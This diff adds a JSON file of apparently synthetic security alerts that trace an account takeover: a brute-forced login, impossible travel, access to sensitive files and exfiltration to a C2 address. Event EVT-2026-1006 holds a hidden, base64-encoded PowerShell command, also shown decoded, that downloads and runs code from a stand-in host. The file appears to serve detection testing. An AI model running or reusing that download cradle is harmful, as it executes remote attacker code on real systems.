@@ -1,0 +1,163 @@
+[
+  {
+    "id": "EVT-2026-1001",
+    "timestamp": "2026-11-18T10:00:15Z",
+    "source_ip": "10.0.4.12",
+    "destination_ip": "10.0.1.5",
+    "username": "alex.chen",
+    "device_id": "WS-ENG-042",
+    "event_type": "AUTHENTICATION",
+    "action": "LOGIN",
+    "resource_accessed": "PORTAL-INTERNAL",
+    "status": "SUCCESS",
+    "severity": "INFORMATIONAL",
+    "details": {
+      "auth_method": "SAML_MFA",
+      "geo_location": "New York, US",
+      "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+    }
+  },
+  {
+    "id": "EVT-2026-1002",
+    "timestamp": "2026-11-18T10:02:00Z",
+    "source_ip": "198.51.100.42",
+    "destination_ip": "10.0.1.10",
+    "username": "sarah.connor",
+    "device_id": "UNKNOWN-EXTERNAL",
+    "event_type": "AUTHENTICATION",
+    "action": "FAILED_LOGIN_BURST",
+    "resource_accessed": "SSO-GATEWAY",
+    "status": "FAILURE",
+    "severity": "HIGH",
+    "details": {
+      "attempt_count": 15,
+      "failure_reason": "INVALID_PASSWORD",
+      "geo_location": "Bucharest, RO",
+      "user_agent": "Python-urllib/3.10",
+      "notes": "15 rapid consecutive failed authentication attempts in 45 seconds"
+    }
+  },
+  {
+    "id": "EVT-2026-1003",
+    "timestamp": "2026-11-18T10:05:12Z",
+    "source_ip": "198.51.100.42",
+    "destination_ip": "10.0.1.10",
+    "username": "sarah.connor",
+    "device_id": "EXTERNAL-RO-DESKTOP",
+    "event_type": "AUTHENTICATION",
+    "action": "SUCCESSFUL_LOGIN",
+    "resource_accessed": "SSO-GATEWAY",
+    "status": "SUCCESS",
+    "severity": "HIGH",
+    "details": {
+      "auth_method": "PASSWORD_ONLY",
+      "geo_location": "Bucharest, RO",
+      "asn": "AS9009 M247 Europe",
+      "unfamiliar_ip": true,
+      "user_agent": "Mozilla/5.0 (X11; Linux x86_64)",
+      "notes": "Successful login immediately following credential brute-force from unfamiliar external IP"
+    }
+  },
+  {
+    "id": "EVT-2026-1004",
+    "timestamp": "2026-11-18T10:06:40Z",
+    "source_ip": "198.51.100.42",
+    "destination_ip": "10.0.2.14",
+    "username": "sarah.connor",
+    "device_id": "EXTERNAL-RO-DESKTOP",
+    "event_type": "GEOGRAPHIC_ANOMALY",
+    "action": "IMPOSSIBLE_TRAVEL_LOGIN",
+    "resource_accessed": "VPN-CONCENTRATOR",
+    "status": "ANOMALY",
+    "severity": "CRITICAL",
+    "details": {
+      "previous_login_location": "Austin, TX, US (09:15 AM)",
+      "current_login_location": "Bucharest, RO (10:06 AM)",
+      "distance_km": 9480,
+      "elapsed_minutes": 51,
+      "impossible_travel": true,
+      "notes": "Physical travel between Austin and Bucharest in 51 minutes is physically impossible"
+    }
+  },
+  {
+    "id": "EVT-2026-1005",
+    "timestamp": "2026-11-18T10:08:22Z",
+    "source_ip": "198.51.100.42",
+    "destination_ip": "10.0.5.20",
+    "username": "sarah.connor",
+    "device_id": "SESSION-TK-9921",
+    "event_type": "FILE_ACCESS",
+    "action": "UNUSUAL_FILE_ACCESS",
+    "resource_accessed": "/shares/finance/2026_q3_salary_audit.xlsx",
+    "status": "ACCESSED",
+    "severity": "HIGH",
+    "details": {
+      "additional_files": [
+        "/shares/r_and_d/sentinel_core_blueprints.enc",
+        "/shares/exec/board_meeting_minutes_november.pdf"
+      ],
+      "access_permission": "READ_RECURSIVE",
+      "department_mismatch": "User role is QA Engineer, accessing Restricted Executive Finance shares",
+      "notes": "Bulk reading of sensitive financial and R&D files from outside normal user access profile"
+    }
+  },
+  {
+    "id": "EVT-2026-1006",
+    "timestamp": "2026-11-18T10:10:05Z",
+    "source_ip": "198.51.100.42",
+    "destination_ip": "10.0.5.20",
+    "username": "sarah.connor",
+    "device_id": "SESSION-TK-9921",
+    "event_type": "PROCESS_EXECUTION",
+    "action": "SUSPICIOUS_COMMAND_EXECUTION",
+    "resource_accessed": "powershell.exe",
+    "status": "EXECUTED",
+    "severity": "CRITICAL",
+    "details": {
+      "command_line": "powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiaAB0AHQAcAA6AC8ALwAyADAAMwAuADAALgAxADEAMwAuADEAOQA5AC8AdABvAG8AbABzACIAKQ==",
+      "decoded_command": "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.199/tools')",
+      "parent_process": "cmd.exe",
+      "target_system": "FS-CORP-FIN01",
+      "mitre_technique": "T1059.001 - Command and Scripting Interpreter: PowerShell",
+      "notes": "Base64 encoded hidden PowerShell process spawned to invoke remote stager payload"
+    }
+  },
+  {
+    "id": "EVT-2026-1007",
+    "timestamp": "2026-11-18T10:12:30Z",
+    "source_ip": "10.0.5.20",
+    "destination_ip": "203.0.113.199",
+    "username": "sarah.connor",
+    "device_id": "SESSION-TK-9921",
+    "event_type": "NETWORK_TRAFFIC",
+    "action": "DATA_EXFILTRATION_BURST",
+    "resource_accessed": "PORT_8443_ENCRYPTED_STREAM",
+    "status": "ALERTED",
+    "severity": "CRITICAL",
+    "details": {
+      "bytes_transferred": 52428800,
+      "protocol": "TLSv1.3",
+      "destination_port": 8443,
+      "threat_intel_match": "Known C2 Beacon IP (AbuseIPDB Score 100/100)",
+      "mitre_technique": "T1041 - Exfiltration Over C2 Channel",
+      "notes": "50MB encrypted outbound burst to external threat IP within 15 seconds"
+    }
+  },
+  {
+    "id": "EVT-2026-1008",
+    "timestamp": "2026-11-18T10:14:02Z",
+    "source_ip": "10.0.2.88",
+    "destination_ip": "10.0.0.1",
+    "username": "marcus.vance",
+    "device_id": "WS-DEV-109",
+    "event_type": "DNS_QUERY",
+    "action": "LOOKUP",
+    "resource_accessed": "github.com",
+    "status": "SUCCESS",
+    "severity": "INFORMATIONAL",
+    "details": {
+      "query_type": "A",
+      "resolved_ip": "140.82.121.4"
+    }
+  }
+]
